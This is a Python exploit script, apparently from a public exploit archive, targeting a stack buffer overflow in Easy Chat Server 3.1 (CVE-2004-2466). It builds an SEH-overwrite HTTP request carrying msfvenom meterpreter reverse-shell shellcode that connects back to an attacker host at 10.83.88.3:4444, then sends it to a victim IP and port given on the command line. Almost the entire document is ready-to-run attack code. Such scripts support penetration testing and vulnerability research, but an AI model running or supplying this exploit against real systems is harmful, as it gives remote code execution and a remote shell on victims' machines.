# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=10.83.88.3 LPORT=4444
# CVE: CVE-2004-2466 
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.83.88.3 LPORT=4444 -f python -b "\x00\x20" -v shellcode
shellcode =  b"\x90" * 16
shellcode += b"\xdb\xd9\xd9\x74\x24\xf4\xba\x94\xcb\xa8\x69"
shellcode += b"\x5e\x33\xc9\xb1\x59\x83\xc6\x04\x31\x56\x15"
shellcode += b"\x03\x56\x15\x76\x3e\x54\x81\xf9\xc1\xa5\x52"
shellcode += b"\x65\xf3\x77\xdb\x80\x97\xfc\x8e\x7a\xd3\x51"
shellcode += b"\x23\xf1\xb1\x41\x0a\xfa\x39\xdd\x26\x22\xcd"
shellcode += b"\x53\x9f\x1b\x11\x3f\xe3\x3a\xed\x42\x30\x9c"
shellcode += b"\xcc\x8c\x45\xdd\x09\x5b\x23\x32\xc7\xd7\x99"
shellcode += b"\xdc\xbf\x6c\x5f\xe0\x3e\xa3\xeb\x58\x39\xc6"
shellcode += b"\x2c\x2c\xf5\xc9\x7c\x47\x5d\xea\x7d\x84\xd5"
shellcode += b"\xa2\x65\x7a\x6f\xfb\xe2\x46\x26\x77\x3e\x3d"
shellcode += b"\x89\x78\x3e\x97\xdb\x46\xed\xd6\xd3\x4a\xef"
shellcode += b"\x1f\xd3\xb4\x9a\x6b\x27\x48\x9d\xa8\x55\x96"
shellcode += b"\x28\x2e\xfd\x5d\x8a\x8a\xff\xb2\x4d\x59\xf3"
shellcode += b"\x7f\x19\x05\x10\x81\xce\x3e\x2c\x0a\xf1\x90"
shellcode += b"\xa4\x48\xd6\x34\xec\x0b\x77\x6d\x48\xfd\x88"
shellcode += b"\x6d\x34\xa2\x2c\xe6\xd7\xb5\x51\x07\x28\xba"
shellcode += b"\x0f\x9f\xe4\x77\xb0\x5f\x63\x0f\xc3\x6d\x2c"
shellcode += b"\xbb\x4b\xdd\xa5\x65\x8b\x54\xa1\x95\x43\xde"
shellcode += b"\xa2\x6b\x64\x1e\xea\xaf\x30\x4e\x84\x06\x39"
shellcode += b"\x05\x54\xa6\xec\xb3\x5e\x30\x05\x10\x07\xc4"
shellcode += b"\x71\x94\xb7\xd5\xdd\x11\x51\x85\x8d\x71\xce"
shellcode += b"\x66\x7e\x31\xbe\x0e\x94\xbe\xe1\x2f\x97\x15"
shellcode += b"\x8a\xda\x78\xc3\xe2\x72\xe0\x4e\x78\xe2\xed"
shellcode += b"\x45\x04\x24\x65\x6f\xf8\xeb\x8e\x1a\xea\x1c"
shellcode += b"\xe9\xe4\xf2\xdc\x9c\xe4\x98\xd8\x36\xb3\x34"
shellcode += b"\xe3\x6f\xf3\x9a\x1c\x5a\x80\xdd\xe3\x1b\xb0"
shellcode += b"\x96\xd2\x89\xfc\xc0\x1a\x5e\xfc\x10\x4d\x34"
shellcode += b"\xfc\x78\x29\x6c\xaf\x9d\x36\xb9\xdc\x0d\xa3"
shellcode += b"\x42\xb4\xe2\x64\x2b\x3a\xdc\x43\xf4\xc5\x0b"
shellcode += b"\xd0\xf3\x39\xc9\xff\x5b\x51\x31\x40\x5c\xa1"
shellcode += b"\x5b\x40\x0c\xc9\x90\x6f\xa3\x39\x58\xba\xec"
shellcode += b"\x51\xd3\x2b\x5e\xc0\xe4\x61\x3e\x5c\xe4\x86"
shellcode += b"\x9b\x6f\x9f\xe7\x1c\x90\x60\xee\x78\x91\x60"
shellcode += b"\x0e\x7f\xae\xb6\x37\xf5\xf1\x0a\x0c\x06\x44"
shellcode += b"\x2e\x25\x8d\xa6\x7c\x35\x84"

buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 10.83.88.3:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://10.83.88.3\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")